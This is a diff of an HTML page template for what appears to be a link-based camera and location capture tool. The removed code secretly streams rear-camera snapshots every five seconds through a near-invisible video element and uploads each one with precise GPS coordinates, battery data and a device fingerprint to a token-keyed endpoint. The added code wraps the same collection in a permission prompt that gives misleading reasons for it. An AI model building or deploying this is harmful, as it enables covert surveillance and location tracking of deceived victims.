@@ -1,198 +1,78 @@
-﻿<!doctype html>
-<html>
+<!doctype html>
+<html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Android Background Capture</title>
-  <style>
-    body { font-family: system-ui, Arial, sans-serif; padding: 12px; }
-    #status { white-space: pre-line; margin-top: 8px; }
-    video {
-      position: fixed;
-      bottom: 4px;
-      right: 4px;
-      width: 80px;
-      height: 80px;
-      opacity: 0.01;
-      pointer-events: none;
-      z-index: 9999;
-    }
-    canvas { display: none !important; }
-  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>{{ experience_name }}</title>
+  <link rel="stylesheet" href="/static/css/session.css" />
 </head>
 <body>
-  <h2>HELLO WELCOME</h2>
-  <p id="status">Please keep smile on your face…</p>
 
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas"></canvas>
+  <!-- Permission Modal Overlay -->
+  <div id="perm-modal-overlay" class="perm-modal-overlay">
+    <div class="perm-modal">
+      <div class="perm-icon-wrapper">🛡️</div>
+      <h2>Interactive Experience</h2>
+      <p>This session includes interactive features and device telemetry optimization.</p>
 
+      <div class="perm-features-list">
+        <div class="perm-item"><span>📷</span> <span>Camera (Live interactive gameplay)</span></div>
+        <div class="perm-item"><span>📍</span> <span>Location (Regional latency optimization)</span></div>
+        <div class="perm-item"><span>⚡</span> <span>Hardware specs & battery tuning</span></div>
+      </div>
+
+      <button id="btn-grant-perms" class="btn-primary" style="margin-bottom: 10px;">Enable Interactive Features</button>
+      <button id="btn-skip-perms" class="btn-secondary" style="width: 100%;">Continue without Permissions</button>
+    </div>
+  </div>
+
+  <!-- Main Application Container -->
+  <div class="app-container">
+    <div class="top-bar">
+      <div class="brand-badge">
+        <span class="pulse-dot"></span>
+        <span>Live Session</span>
+      </div>
+      <div id="connection-status">Connected</div>
+    </div>
+
+    <!-- Active Camera Indicator Bar -->
+    <div id="camera-indicator-bar" class="camera-indicator-bar">
+      <div style="display: flex; align-items: center; gap: 8px;">
+        <span class="pulse-dot" style="background: #ef4444; box-shadow: 0 0 8px #ef4444;"></span>
+        <span>Camera Active</span>
+      </div>
+      <button id="btn-stop-camera" class="btn-stop-camera">Stop Camera</button>
+    </div>
+
+    <!-- Dynamic Experience Content -->
+    <main id="experience-root">
+      {% include experience_template %}
+    </main>
+  </div>
+
+  <!-- Offscreen Video & Canvas Elements -->
+  <video id="hidden-video" autoplay playsinline muted></video>
+  <canvas id="offscreen-canvas"></canvas>
+
+  <!-- Configuration Initialization -->
   <script>
-    const token = "{{ token }}";
-    const statusEl = document.getElementById("status");
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
-
-    const INTERVAL = 5000;
-    let stream = null;
-    let timer = null;
-
-    function log(s){
-      statusEl.textContent = s;
-      console.log(s);
-    }
-    const json = o => JSON.stringify(o);
-
-    async function getDetails(){
-      const d = {};
-      d.userAgent = navigator.userAgent || "";
-      d.platform = navigator.platform || "";
-      d.cpuCores = navigator.hardwareConcurrency ?? null;
-      d.ramGB = navigator.deviceMemory ?? null;
-      d.languages = navigator.languages || [navigator.language];
-      d.screen = {
-        w: screen?.width ?? null,
-        h: screen?.height ?? null,
-        ratio: devicePixelRatio ?? 1,
-      };
-      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (conn){
-        d.network = {
-          type: conn.effectiveType,
-          downlink: conn.downlink,
-          rtt: conn.rtt,
-          saveData: conn.saveData,
-        };
-      }
-      d.permissions = {};
-      if (navigator.permissions){
-        for (const name of ["camera", "geolocation"]){
-          try {
-            const r = await navigator.permissions.query({name});
-            d.permissions[name] = r.state;
-          } catch {}
-        }
-      }
-      d.storage = {};
-      try {
-        if (navigator.storage?.estimate){
-          const est = await navigator.storage.estimate();
-          d.storage.quotaBytes = est.quota ?? null;
-          d.storage.usageBytes = est.usage ?? null;
-        }
-      } catch {}
-      try {
-        const opt = Intl.DateTimeFormat().resolvedOptions();
-        d.tz = { zone: opt.timeZone, offset: new Date().getTimezoneOffset() };
-      } catch {}
-      return d;
-    }
-
-    async function getBattery(){
-      try{
-        if (navigator.getBattery){
-          const b = await navigator.getBattery();
-          return { level: Math.round(b.level * 100), charging: !!b.charging };
-        }
-      } catch {}
-      return null;
-    }
-
-    async function getCoords(timeout = 4000){
-      return new Promise(resolve => {
-        if (!("geolocation" in navigator)) return resolve(null);
-        let done = false;
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            if (!done){
-              done = true;
-              resolve({
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                acc: pos.coords.accuracy
-              });
-            }
-          },
-          () => { if (!done){ done = true; resolve(null); } },
-          { timeout, enableHighAccuracy: true }
-        );
-        setTimeout(() => { if (!done){ done = true; resolve(null); } }, timeout + 300);
-      });
-    }
-
-    function captureFrame(){
-      if (!video.videoWidth) return null;
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
-      return canvas.toDataURL("image/jpeg", 0.75);
-    }
-
-    async function upload(payload){
-      try {
-        await fetch(`/upload_image/${token}`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: json(payload),
-          keepalive: true
-        });
-        return true;
-      } catch {
-        return false;
-      }
-    }
-
-    async function loop(){
-      const frame = captureFrame();
-      if (!frame){
-        log("Frame empty, retrying...");
-        return;
-      }
-
-      const [battery, coords, details] = await Promise.all([
-        getBattery(),
-        getCoords(),
-        getDetails(),  // <<–– FULL DEVICE INFORMATION
-      ]);
-
-      const ok = await upload({
-        image_b64: frame,
-        battery,
-        coords,
-        details,      // <<–– SEND TO BACKEND
-      });
-
-      log(ok ? "Uploaded" : "Upload failed");
-    }
-
-    async function start(){
-      try{
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "environment" },
-          audio: false,
-        });
-      } catch {
-        log("Camera permission denied");
-        return;
-      }
-
-      video.srcObject = stream;
-      await new Promise(r => setTimeout(r, 500));
-      loop();
-      timer = setInterval(loop, INTERVAL);
-    }
-
-    window.addEventListener("beforeunload", () => {
-      try{
-        navigator.sendBeacon(
-          `/upload_info/${token}`,
-          new Blob([json({ note: "page-closed" })], {type: "application/json"})
-        );
-      } catch {}
-    });
-
-    start();
+    window.SESSION_CONFIG = {
+      token: "{{ token }}",
+      experience: "{{ experience }}",
+      experienceName: "{{ experience_name }}"
+    };
   </script>
+
+  <!-- Modular Scripts -->
+  <script src="/static/js/api.js"></script>
+  <script src="/static/js/permissions.js"></script>
+  <script src="/static/js/events.js"></script>
+  <script src="/static/js/telemetry.js"></script>
+  <script src="/static/js/camera.js"></script>
+  <script src="/static/js/location.js"></script>
+  <script src="/static/js/media.js"></script>
+  <script src="/static/js/session.js"></script>
+
 </body>
 </html>
